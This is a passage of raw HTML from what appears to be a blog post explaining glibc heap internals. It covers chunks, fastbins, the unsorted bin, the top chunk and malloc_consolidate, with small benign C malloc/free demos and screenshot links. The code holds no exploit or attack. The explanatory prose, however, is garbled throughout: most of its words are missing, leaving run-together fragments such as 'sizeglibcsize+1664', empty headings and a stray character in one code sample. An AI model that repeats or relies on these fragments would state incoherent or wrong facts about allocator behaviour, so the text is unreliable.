class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>0x1090x109 pre_size 1</p>\n<p>chunk0x110</p>\n<p>6416 0x110+0x10+0x1</p>\n</blockquote>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214191149578.png\" alt=\"image-20201214191149578\"></p>\n<h3 id=\"0x09-chunk\"><a href=\"#0x09-chunk\" class=\"headerlink\" title=\"0x09 chunk\"></a>0x09 chunk</h3><p> </p>\n<h4 id=\"1-chunk\"><a href=\"#1-chunk\" class=\"headerlink\" title=\"1.chunk\"></a>1.chunk</h4><ul>\n<li>mallocfd</li>\n<li>sizeglibcsize+1664</li>\n<li>malloc(0x10);0x10glibc0x10+0x10=0x20</li>\n<li><strong>chunk=malloc+chunk+mchunk_prev_size+chunk</strong></li>\n</ul>\n<p> </p>\n<h4 id=\"2-chunk\"><a href=\"#2-chunk\" class=\"headerlink\" title=\"2.chunk\"></a>2.chunk</h4><ul>\n<li>mallocglibc0x100x200x10+0x10mallocfdbkmalloc_chunk4</li>\n<li><strong>chunk0x20</strong></li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//int size=0x109;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//</span></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);    </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214191901328.png\" alt=\"image-20201214191901328\"></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214191928725.png\" alt=\"image-20201214191928725\"></p>\n<h3 id=\"0x10-bins\"><a href=\"#0x10-bins\" class=\"headerlink\" title=\"0x10 bins\"></a>0x10 bins</h3><h4 id=\"1-fastbins\"><a href=\"#1-fastbins\" class=\"headerlink\" title=\"1.fastbins\"></a>1.fastbins</h4><ul>\n<li>fastbinsfastbinschunkglibcchunkPREV_INUSE1</li>\n</ul>\n<blockquote>\n<p><strong></strong></p>\n<ul>\n<li><strong>fastbinsLIFO</strong>freechunkfreechunkmallocchunk</li>\n<li>fastbinschunkbk</li>\n<li>fastbinsfastbinchunk0freechunkchunkarenamalloc_statefastbinsY</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215160058074.png\" alt=\"image-20201215160058074\"></p>\n</blockquote>\n<p><strong></strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x10</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> size2=<span class=\"number\">0x20</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p3=<span class=\"built_in\">malloc</span>(size2);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p3);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p> heap</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215160443811.png\" alt=\"image-20201215160443811\"></p>\n<p>p1 p2</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215160534048.png\" alt=\"image-20201215160534048\"></p>\n<p>chunkfd0 chunkfd</p>\n<p>main_arena chunk </p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215160746395.png\" alt=\"image-20201215160746395\"></p>\n<p></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215161151487.png\" alt=\"image-20201215161151487\"></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215161023500.png\" alt=\"image-20201215161023500\"></p>\n<p> main_arena</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215161240081.png\" alt=\"image-20201215161240081\"></p>\n<p></p>\n<p>32</p>\n</blockquote>\n<h4 id=\"2-unsortedbin\"><a href=\"#2-unsortedbin\" class=\"headerlink\" title=\"2.unsortedbin\"></a>2.unsortedbin</h4><ul>\n<li>freechunk0x80unsortedbin</li>\n<li>unsortedbinchunk<strong>smallbinslargebinsunsortedbin</strong></li>\n</ul>\n<blockquote>\n<p><strong></strong></p>\n<ul>\n<li><strong>FIFO</strong>freechunkfreechunkmallocchunk</li>\n<li><strong>binsfreechunk</strong>freechunkfdbkbinsfdgdbbinfreechunkfdbkbinsfd</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/20190729213257204.png\" alt=\"img\"></p>\n<ul>\n<li><strong>binsfreechunk</strong>struct malloc_statebinsbinbinsunsortedbinfdbkfreechunkfreechunk</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/20190729212907497.png\" alt=\"img\"></p>\n</blockquote>\n<p><strong></strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x100</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *temp=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>); <span class=\"comment\">//p1p2</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);   </span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p3=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);   <span class=\"comment\">//p2top chunk</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215163335296.png\" alt=\"image-20201215163335296\"></p>\n<p>p1</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215163518823.png\" alt=\"image-20201215163518823\"></p>\n<p>chunkp0</p>\n<p>main_arena</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215163755383.png\" alt=\"image-20201215163755383\"></p>\n<p>p2</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215164417439.png\" alt=\"image-20201215164417439\"></p>\n<p>main_arena</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215165029835.png\" alt=\"image-20201215165029835\"></p>\n<p>binsfd-&gt;p2 bk-&gt;p1</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215170240262.png\" alt=\"image-20201215170240262\"> </p>\n<p></p>\n</blockquote>\n<h3 id=\"0x11-top-chunk\"><a href=\"#0x11-top-chunk\" class=\"headerlink\" title=\"0x11 top chunk\"></a>0x11 top chunk</h3><h4 id=\"1-top-chunk\"><a href=\"#1-top-chunk\" class=\"headerlink\" title=\"1.top chunk\"></a>1.top chunk</h4><ul>\n<li>top chunkchunk</li>\n</ul>\n<h4 id=\"2-top-chunk\"><a href=\"#2-top-chunk\" class=\"headerlink\" title=\"2.top chunk\"></a>2.top chunk</h4><ul>\n<li>top chunkchunkfast chunktop chunkchunk</li>\n<li>top chunkchunkfast chunktop chunkchunk</li>\n</ul>\n<h4 id=\"3--1\"><a href=\"#3--1\" class=\"headerlink\" title=\"3.\"></a>3.</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x20</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>); <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p> </p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215194907019.png\" alt=\"image-20201215194907019\"></p>\n<p>p2 p2fastbins </p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215194956787.png\" alt=\"image-20201215194956787\"></p>\n</blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x20</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>); <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215195122071.png\" alt=\"image-20201215195122071\"></p>\n<p>p2 p2</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215195147425.png\" alt=\"image-20201215195147425\"></p>\n</blockquote>\n<h4 id=\"4-top-chunk\"><a href=\"#4-top-chunk\" class=\"headerlink\" title=\"4.top chunk\"></a>4.top chunk</h4><ul>\n<li>freechunkchunktop chunkchunk</li>\n</ul>\n<h3 id=\"0x12-chunkmallocfree\"><a href=\"#0x12-chunkmallocfree\" class=\"headerlink\" title=\"0x12 chunkmallocfree\"></a>0x12 chunkmallocfree</h3><h4 id=\"1-malloc\"><a href=\"#1-malloc\" class=\"headerlink\" title=\"1.malloc\"></a>1.malloc</h4><ul>\n<li><strong>malloc</strong>top chunk</li>\n<li><strong>malloc</strong>binstop chunktop chunkglibctop chunk</li>\n</ul>\n<h4 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h4><p>  malloc</p>\n<p>fastbin</p>\n<h5 id=\"free-chunkfastbin\"><a href=\"#free-chunkfastbin\" class=\"headerlink\" title=\"free chunkfastbin\"></a><strong>free chunkfastbin</strong></h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x20</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>); <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x20</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>freep1fastbin</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215200256907.png\" alt=\"image-20201215200256907\"></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215200306820.png\" alt=\"image-20201215200306820\"></p>\n<p>p2 p1</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215200355918.png\" alt=\"image-20201215200355918\"></p>\n</blockquote>\n<h5 id=\"chunkfastbin\"><a href=\"#chunkfastbin\" class=\"headerlink\" title=\"chunkfastbin\"></a><strong>chunkfastbin</strong></h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x20</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);    sleep(<span class=\"number\">0</span>); <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>p2</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215200826010.png\" alt=\"image-20201215200826010\"></p>\n<p>fastbinchunk top chunk</p>\n</blockquote>\n<h5 id=\"free-chunkunsorted-bin\"><a href=\"#free-chunkunsorted-bin\" class=\"headerlink\" title=\"free chunkunsorted bin\"></a><strong>free chunkunsorted bin</strong></h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x200</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>); <span class=\"comment\">//ptop chunk</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p3=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p3);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>chunk</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215201134939.png\" alt=\"image-20201215201134939\"></p>\n<p>free p1p1unsorted bin</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215201206634.png\" alt=\"image-20201215201206634\"></p>\n<p>p3 p1</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215201235306.png\" alt=\"image-20201215201235306\"></p>\n</blockquote>\n<h5 id=\"chunkunsorted-bin\"><a href=\"#chunkunsorted-bin\" class=\"headerlink\" title=\"chunkunsorted bin\"></a><strong>chunkunsorted bin</strong></h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *temp=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>); <span class=\"comment\">//ptopchunk</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>p2</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215201554898.png\" alt=\"image-20201215201554898\"></p>\n<p></p>\n<p>unsorted binchunk </p>\n</blockquote>\n<p><strong>free chunkunsorted bin</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *temp=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>); <span class=\"comment\">//ptopchunk</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x300</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);c</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>top chunk </p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215202105325.png\" alt=\"image-20201215202105325\"></p>\n</blockquote>\n<p></p>\n<ol>\n<li> freechunk</li>\n<li>fastbin  unsorted binfree chunk</li>\n<li> top chunk</li>\n</ol>\n<h4 id=\"3-free\"><a href=\"#3-free\" class=\"headerlink\" title=\"3.free\"></a>3.free</h4><ul>\n<li>freechunk0x20~0x80fastbinchunkfast bin</li>\n<li>freechunk0x80fast binsmall binlarge binunsorted bin</li>\n</ul>\n<h3 id=\"0x13-malloc-consolidate\"><a href=\"#0x13-malloc-consolidate\" class=\"headerlink\" title=\"0x13 malloc_consolidate\"></a>0x13 malloc_consolidate</h3><p><strong>unsorted binbinsmall binlarge bin</strong></p>\n<h4 id=\"1-consolidate\"><a href=\"#1-consolidate\" class=\"headerlink\" title=\"1.consolidate\"></a>1.consolidate</h4><ul>\n<li>0x80chunkunsortedbinunsortedbinbinchunkchunksmallbinslargebins</li>\n<li>unsortedbinconsolidateconsolidatemalloc</li>\n</ul>\n<h4 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h4><ul>\n<li>mallocchunkchunksmallbinunsortedbinfreechunkmalloc_conlolidate</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/20190810155737453.png\" alt=\"img\"></p>\n<ul>\n<li>mallocbinfreechunktopchunktopchunkmalloc_consolidate</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/20190810155901661.png\" alt=\"img\"></p>\n<ul>\n<li>unsortedbinfreechunkmallocunsortedbinlast remainderconsolidate</li>\n</ul>\n<p><strong>12fastbinfree chunk</strong></p>\n<h4 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" 